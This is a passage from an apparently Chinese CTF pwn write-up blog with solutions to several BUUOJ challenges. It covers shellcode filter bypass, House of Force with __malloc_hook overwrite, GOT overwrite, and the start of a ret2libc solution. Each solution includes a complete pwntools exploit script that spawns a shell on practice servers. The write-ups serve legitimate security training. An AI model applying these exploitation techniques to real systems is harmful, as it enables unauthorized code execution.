style=\"text-align:center\">movslq (%{64bit}), %</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">h</td>\n<td style=\"text-align:center\">0x68</td>\n<td style=\"text-align:center\">push [dword]</td>\n</tr>\n<tr 32bit=\"\">\n<td style=\"text-align:center\">i</td>\n<td style=\"text-align:center\">0x69</td>\n<td style=\"text-align:center\">imul [dword], (%{64bit}), %</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">j</td>\n<td style=\"text-align:center\">0x6a</td>\n<td style=\"text-align:center\">push [byte]</td>\n</tr>\n</tbody>\n</table>\n<p>执行 shellcode 前程序情况如下</p>\n<p>。<img data-src=\"./image-20231119164111529.png\" alt=\"image-20231119164111529\"></p>\n<p>因此要构造 read 函数，只需将 rdi 清零。我们可以用 <code>'_'</code>  直接 pop rdi，找到栈上为 0 的位置。加上 call 往栈上插入的 rip 地址，需要 pop 共 6 次。</p>\n<p><img data-src=\"./image-20231119175549213.png\" alt=\"image-20231119175549213\"></p>\n<p>这里记得 patchelf，不同 libc 产生的栈结构不同。刚开始我没有调整，所以一直本地成功远程失败。这里附上一张 ubuntu22.04 下的栈结构。</p>\n<img data-src=\"./image-20231119171924648.png\" alt=\"image-20231119171924648\" style=\"zoom:25%;\" />\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">.</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./starctf_2019_babyshell_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29462</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b puts'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'_'</span><span class=\"token operator\">*</span><span class=\"token number\">10</span> <span class=\"token operator\">+</span> asm<span class=\"token punctuation\">(</span><span class=\"token string\">'syscall'</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'plz:'</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>payload <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span><span class=\"token string\">'nop'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">14</span> <span class=\"token operator\">+</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>但是这个方法我本地打的通，远程却打不通，可能版本还是对不上？</p>\n<h2 id=\"绕过验证\"><a class=\"markdownIt-Anchor\" href=\"#绕过验证\">#</a> 绕过验证</h2>\n<p>验证在常规字符串结束后便停止。因此只要在 shellcraft 前面加上 <code>'\\0'</code> ，便可轻松绕过验证。</p>\n<p>但是加上的部分必须为合法的机器码。恰好有一个 <code>push [byte]</code>  可以将紧接着的放入栈上。因此构造一个 <code>push 0</code> ，即 <code>b&quot;j\\0&quot;</code>  便可绕过验证。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">.</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./starctf_2019_babyshell_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29462</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b puts'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'j\\0'</span> <span class=\"token operator\">+</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"gyctf_2020_force\"><a class=\"markdownIt-Anchor\" href=\"#gyctf_2020_force\">#</a> gyctf_2020_force</h1>\n<p>** 考点：**hof</p>\n<p>**libc 版本：**libc6_2.23_0ubuntu10_amd64</p>\n<p>保护全开，只有分配函数，但是写入数据的最大长度固定为 0x50，且会返回 chunk 所处位置。</p>\n<p>因此可以修改 top 的 size。然后就可以实现任意地址读写。</p>\n<p>在修改 top 的 size 之前，先分配一个很大的 chunk，该 chunk 便会以 mmap 的形式分配在 libc 紧邻的低地址处，以此获得 libc 基地址。</p>\n<p><img data-src=\"./image-20231119222021018.png\" alt=\"image-20231119222021018\"></p>\n<p>左侧绿线红色即为 libc 基地址，左侧绿线紫色为大 chunk 所分配的起始地址。计算偏移为 0x200ff0。</p>\n<p>然后分配一个小 chunk，如 0x18 大小的 chunk，顺便将 top size 设为 - 1，同时得到小 chunk 的地址，top 的地址便为其加 0x10。</p>\n<p>之后计算出 <code>__malloc_hook</code>  的地址，然后分配一个 chunk 使得 top chunk 指向 malloc_hook 小 20 地址的地方。计算得到所需分配的 chunk 大小即为 <code>malloc_hook - top address - 0x30</code> 。之后再次分配 chunk 便可以修改 <code>__malloc_hook</code>  的值。</p>\n<p>由于直接将 <code>__malloc_hook</code>  修改为 one_gadget 将不满足条件，则利用 realloc 作为跳板，同时修改 <code>__realloc_hook</code>  的值为 one_gadget。经调试，需要减少两个 realloc 函数的 pop 命令以此达到利用条件，所以 <code>__malloc_hook</code>  调用的 realloc 地址加 4。</p>\n<p><img data-src=\"./image-20231119224848965.png\" alt=\"image-20231119224848965\"></p>\n<p><code>0x7ffcdbbbcec8</code>  为调佣 <code>__malloc_hook</code>  前的栈状态，这里 `__malloc_hook 跳转 realloc+4。</p>\n<p><img data-src=\"./image-20231119224937682.png\" alt=\"image-20231119224937682\"></p>\n<p>以上图为 <code>call rax</code>  即调用 one_gadget 后的栈状态。此时 rsp+0x70 的地址即为 <code>0x7ffcdbbbced8</code>  处，刚好为 0。rsp+0x30 也是，选一个即可。</p>\n<p><img data-src=\"./image-20231119224950904.png\" alt=\"image-20231119224950904\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'gyctf_2020_force'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29788</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *$rebase(0xCA5)'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'2:puts\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> content<span class=\"token operator\">=</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'size\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'addr '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'content\\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">return</span> addr</pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>mc1u <span class=\"token operator\">=</span> mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x200000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>libcbase <span class=\"token operator\">=</span> mc1u <span class=\"token operator\">+</span> <span class=\"token number\">0x200ff0</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>mh_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>realloc_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'realloc'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>onegadget <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0xf1147</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>c1u <span class=\"token operator\">=</span> mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'/bin/sh\\0'</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xffffffffffffffff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>t1 <span class=\"token operator\">=</span> c1u <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'t1:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>t1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'size:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>mh_a<span class=\"token operator\">-</span>t1<span class=\"token operator\">-</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>mal<span class=\"token punctuation\">(</span>mh_a <span class=\"token operator\">-</span> t1 <span class=\"token operator\">-</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>onegadget<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>realloc_a<span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'size'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>obj = LibcSearcher('__malloc_hook',mh_a)</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>libcbase = mh_a - obj.dump('__malloc_hook')</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>fh_a = libcbase + obj.dump('__free_hook')</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>sys_a = libcbase + obj.dump('system')</pre></td></tr><tr><td data-num=\"55\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"wustctf2020_name_your_dog\"><a class=\"markdownIt-Anchor\" href=\"#wustctf2020_name_your_dog\">#</a> wustctf2020_name_your_dog</h1>\n<p>** 考点：** 送分题</p>\n<p>未开启 pie 和 relro 保护。</p>\n<p>未判断数组下标，直接任意地址读写修改 got 表为后门函数 shell 的地址。</p>\n<p>因为该程序为 32 位程序，以 4 字节为单位，但其写入以 8 字节为单位。数组起始地址为 0x8041060，所以必须寻找 got 表地址以 8 或 0 结尾的。</p>\n<p><img data-src=\"./image-20231120133449929.png\" alt=\"image-20231120133449929\"></p>\n<p>因此这里不能修改 printf，应该去修改 scanf。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./wustctf2020_name_your_dog'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./wustctf2020_name_your_dog')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28854</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b printf')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x80485CB</span> </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>offset <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__isoc99_scanf'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x0804a060</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>index <span class=\"token operator\">=</span> offset <span class=\"token operator\">//</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset </pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n>'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'plz: '</span><span class=\"token punctuation\">,</span> p32<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"wdb_2018_3rd_soeasy\"><a class=\"markdownIt-Anchor\" href=\"#wdb_2018_3rd_soeasy\">#</a> wdb_2018_3rd_soEasy</h1>\n<p>** 考点：**ret2libc</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'wdb_2018_3rd_soEasy'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_i386/libc/lib/i386-linux-gnu/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./\"</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28559</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    